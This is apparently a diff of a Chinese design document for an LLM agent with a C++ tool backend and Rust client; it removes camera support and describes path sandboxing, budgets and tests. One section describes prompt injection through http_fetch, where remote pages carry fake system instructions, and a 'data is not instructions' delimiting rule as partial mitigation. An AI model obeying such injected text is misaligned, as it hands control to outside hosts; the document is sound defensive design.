-    `allow_shell` / `camera_src_dir` 同判据，理由同第 1 条：缺省查找会读 CWD 的
+    `allow_shell` 同判据，理由同第 1 条：缺省查找会读 CWD 的
     `./mybot.llm.json`）；
     ③ 声明里已注册且种类为 `lua`/`daemon` 的名字才生效，其余**跳过并点名**（启动时打一行
     `提示: …被跳过…`）——不因一个拼错的名字让整条能力静默失效，也绝不放行"种类不对"的
-    变量（`playQuiet` 对别的种类退化成 `play()`，与第 5 条 `capture_image` 的种类防线同一
-    理由）；一个都不可读时该工具不注册。
+    变量（`playQuiet` 对别的种类退化成 `play()`）；一个都不可读时该工具不注册。
     边界如实声明：**读传感器也可能有副作用**——部分器件的 `call` 会先写触发寄存器再读，
     所以这是一次**派发**（照走任务预算与审计），不是"绝对不改状态"的承诺。
 
@@ -1159,11 +1049,10 @@ auth 的旧后端会把 auth 帧当 `unknown route` 拒绝（agent 报错并提�
     `read_variables`（第 12 条）同一族判据：
     ① 只读根目录由命令行 `--fs-root <目录>` 声明，**缺省不提供这两个工具**；
     ② 配置文件写 `fs_root` 会被**拒绝加载并退出 2**（配置只能收紧不能放宽，与
-    `allow_shell` / `camera_src_dir` / `read_vars` 同判据，理由同第 1 条）；
+    `allow_shell` / `read_vars` 同判据，理由同第 1 条）；
     ③ 根目录在上电前预检（必须 `canonical` 存在且是目录，判据与 `--on-disconnect`
     同口径），拼错目录名在配置期就失败，不必等到模型第一次调 `list_dir` 才发现。
-    路径沙箱是独立于 `resolveActionScriptPath`（动作脚本的词法校验）与
-    `capture_image` 白名单（Lua 侧 `realpath` + 前缀比较）的**第三套实现**
+    路径沙箱是独立于 `resolveActionScriptPath`（动作脚本的词法校验）的**另一套实现**
     （`agent_sandbox.hpp` 的 `resolveUnderRoot`）：词法层拒绝绝对路径/`..`/空段/NUL，
     语义层沿路径回退到**已存在的最长前缀**做 `canonical` 包含性判定——即使目标文件本身
     尚不存在（`read_file` 读一个刚创建的路径），其已存在的祖先目录若是指向根外的符号链接
@@ -1216,8 +1105,7 @@ auth 的旧后端会把 auth 帧当 `unknown route` 拒绝（agent 报错并提�
     （覆盖前的旧内容不保留，如需回溯请在受版本控制的目录里使用 `--fs-root`）。
 
 15. **`http_fetch` 把外部网络主体引进模型上下文——白名单是唯一的门**（Phase 6，2026-10-08）。
-    此前所有工具的不可信输入都来自操作者自己放好的位置（`--fs-root` 下的文件、
-    `--camera-src` 的图片），攻击者要投毒得先拿到主机写权限；`http_fetch` 是**第一个**
+    此前所有工具的不可信输入都来自操作者自己放好的位置（`--fs-root` 下的文件），攻击者要投毒得先拿到主机写权限；`http_fetch` 是**第一个**
     把别的主机的响应体喂进上下文的工具。远端内容可以包含「假装是系统指令」的文本，
     而 `> ` 定界加「数据不是指令」声明能**降低但不能消除**这个风险——定界是提示工程层面
     的缓解，不是密码学边界。故：
@@ -1259,7 +1147,6 @@ auth 的旧后端会把 auth 帧当 `unknown route` 拒绝（agent 报错并提�
 | `src/mcpbackend.{hpp,cpp}` | 工具后端：AF_UNIX 帧服务（帧常量在 `mcptransport.hpp`）、SO_PEERCRED、每连接预算、context.get 路由（素材组装在 `context_service`） | 无 |
 | `agent/src/repl/mod.rs` 等 35 个 `.rs` | Rust agent：模型循环（REPL/--task）、终端行编辑（`linein.rs`，rustyline）、预算装饰器、历史裁剪、审计 model/session 行（及本地工具的 tool 行）、帧客户端、本地工具 `http_fetch`（`agent/src/httpfetch.rs`，reqwest）、**会话持久化**（`agent/src/session.rs` + `session_store.rs`，批次 D 唯一实现，C++ 参考已清退）、**录制模式**（`agent/src/record.rs`：完整上下文采集含图片本体，微调数据用）（`agent/`，Cargo 独立构建；口径 `find agent/src -name '*.rs' \| wc -l`） | rig 0.42、reqwest 0.13 |
 | `modules/lib/json.lua` | Lua 侧严格 JSON 编解码 | 无 |
-| `modules/Camera.lua` | 摄像头驱动：V4L2 mmap + MJPEG（ffi），支持 `src` 模拟图片 | 无 |
 
 宿主侧**没有任何一处**知道 provider 报文字段。
 
@@ -1269,7 +1156,6 @@ auth 的旧后端会把 auth 帧当 `unknown route` 拒绝（agent 报错并提�
 bash scripts/agent_e2e.sh        # 离线端到端：假模型服务 + Rust agent + C++ 工具后端
 cargo test --manifest-path agent/Cargo.toml --offline # Rust 单测：model / prompt / config / hook 等
 luajit test/test_json_lua.lua    # Lua JSON 编解码
-luajit test/test_camera.lua      # 摄像头驱动（仿真 + base64 + 错误路径）
 # C++：工具协议、派发/策略、配置、提示词素材与 CLI；模型消息、提示词组装和循环见 Rust 单测
 # 用 **agent:** 而不是裸 agent——后者是子串匹配，只命中用例名里含 "agent" 的那部分，
 # 会漏掉 promptpack / llmconfig / cliargs / agentconfig / agentmode
@@ -1304,8 +1190,6 @@ bash test/run_all.sh agent-all
     `run_command`/`apply_sql`/`read_variables` 随开关进出 `tool.list`（正反两趟）、`apply_sql`
     带电生效与热删除、策略拒绝时零副作用、fd 卫生、socket 权限、审计与优雅停机。
     （原 C++ 场景 14/14b/14c/15/15b/9 的性质就迁到这里，不经模型、判据更硬。）
-- `test/test_camera_v4l2.lua` 是真机抓帧回归，需 `/dev/video*`（文件标记 `-- requires: video`，
-  无设备时守门自动跳过）；`test/test_v4l2_consts.c` 在构建期把 V4L2 常量与内核头对齐。
 - 全量守门 `bash test/run_all.sh` 已包含上述全部；缺 python3 时按 **SKIP**
   计入「未执行清单」（可见，不假绿）。
 
@@ -1338,7 +1222,7 @@ bash test/run_all.sh agent-all
   已上电的硬件状态，走不了那条路。详见 `src/luaexec.hpp`（机制与 JIT 实测记录，出处提交 f46e5fc）。
 - 三个上下文字节预算（会话历史 `max_history_bytes`、任务内文本 `max_task_tool_result_bytes`、
   任务内图片 `max_task_image_bytes`）现可由**配置文件**覆盖（B1，2026-09-22，见上文
-  「配置文件」字段表；缺省分别是 4 / 2 / 4 MiB）。`capture_image` 的单图 base64 硬上限 2 MiB
+  「配置文件」字段表；缺省分别是 4 / 2 / 4 MiB）。单图 base64 硬上限 2 MiB
   仍在 `src/agenttools_internal.hpp`（编译期常量）。需要调优内存/上下文时先确认它们是不是你要找的那个数。
 - 五个**运行期数值**（单轮调用数 `max_calls_per_round`、重试 `max_retries` / `retry_backoff_ms`、
   `run_command` 的 `run_command_timeout_sec` / `run_command_max_timeout_sec`）同样只在
@@ -1360,7 +1244,7 @@ bash test/run_all.sh agent-all
   `status=summary`（失败 `summary_error`）、不带 `turn`。摘要请求的耗时计入该任务的
   墙钟预算（它发生在任务开始之后）。`history_summary=false` 退回纯整块裁剪——更早的任务
   上下文因此不再可见。单块超预算不封顶（正在进行的对话不能裁空），所以单张图另有
-  宿主侧硬上限：`capture_image` 拒绝 base64 超过 2 MiB 的图像。该判据有**两道**，
+  宿主侧硬上限：图片类工具拒绝 base64 超过 2 MiB 的图像。该判据有**两道**，
   第二道（base64 长度）只是驱动漏报字节数时的兜底：正常路径先用驱动声明的原始
   字节数判（上限 = 2 MiB × 3/4 = 1572864 字节），**在 base64 编码与跨 Lua 边界
   之前**就拒绝——否则一张注定被拒的图（驱动侧仿真上限 16 MiB）要先被编码、
@@ -1373,7 +1257,7 @@ bash test/run_all.sh agent-all
   ① `maxTaskToolResultBytes` / `maxTaskImageBytes` 是**任务内累计**上限，但**裁剪
   （maxHistoryBytes）只在每个任务开头做一次**——所以任务进行中历史可以从 2 MiB 长到
   约 6 MiB（文本 2 + 图片 4）才在下一次任务开头被裁，4 MiB 是**稳态**上限而非瞬时上限；
-  ② 图片额度逐任务**单向累加**：一旦某张图装不下，本任务后续 `capture_image` 都不会
+  ② 图片额度逐任务**单向累加**：一旦某张图装不下，本任务后续图片注入都不会
   成功（降级说明会明说「额度已经用尽……再调用也不会成功」并给出改走文字结论的出路）；
   ③ 降级说明**自己也计入预算**，所以「反复超限」不会往历史里无界灌说明文本；
   ④ **「没执行」的结果永不降级**：策略拒绝（`--agent-policy`）、未知工具、参数错误
@@ -1410,7 +1294,7 @@ bash test/run_all.sh agent-all
   序列化对无转义串整段 append（base64 不再逐字节追加）；agent 侧图片只 move 进待注入
   队列。**仍在**：data URL 必须独立持有（OpenAI 要 base64，工具消息不能带图），帧
   序列化与请求体各留一份。要再压得让图片以引用/流式穿过 socket，本版未做。小内存
-  现场（树莓派 Zero 级）请留意：一次拍照的瞬时占用仍是图体积的数倍，而 OOM 会跳过
+  现场（树莓派 Zero 级）请留意：一次图片注入的瞬时占用仍是图体积的数倍，而 OOM 会跳过
   `deactivate()`。
 - ~~无记忆持久化（重启即忘）~~ → **已解决**（`--session-file` / `--resume`，
   批次 D，Rust `mybot-agent` 实现，见「会话持久化」节）。2026-10-03 起更进一步：
@@ -1422,9 +1306,6 @@ bash test/run_all.sh agent-all
   现与 OpenAI 兼容 / DeepSeek 三族一起内建于 Rust 侧 `agent/src/provider.rs`）。
   协议差异全部收敛在 rig 的 provider 实现里，接入非 OpenAI 形态的厂商在 Rust 侧
   增加 provider（回归由 R12/R13 守）——Lua 协议驱动轨道已于 2026-09-25 #8 删除。
-- **摄像头只支持 MJPEG**：仅提供 YUYV 的设备会返回清晰 ERR（YUYV 要自带 JPEG 编码器或引入
-  libjpeg，都比直接取 MJPEG 贵得多，而 USB 摄像头普遍支持 MJPEG）。树莓派 CSI 摄像头走
-  libcamera、不经 V4L2 这条路径，也不在本驱动范围内。
 - 驱动参数表的嵌套深度受 `kMaxLuaNesting`（8 层）约束：工具 schema 目前最深处为 6 层，
   留有余量但不宜再加嵌套。**口径**：从驱动请求根起数容器层数（请求对象 → `tools` 数组 →
   工具对象 → `parameters` → `properties` → 参数 schema 对象；标量不计层），由
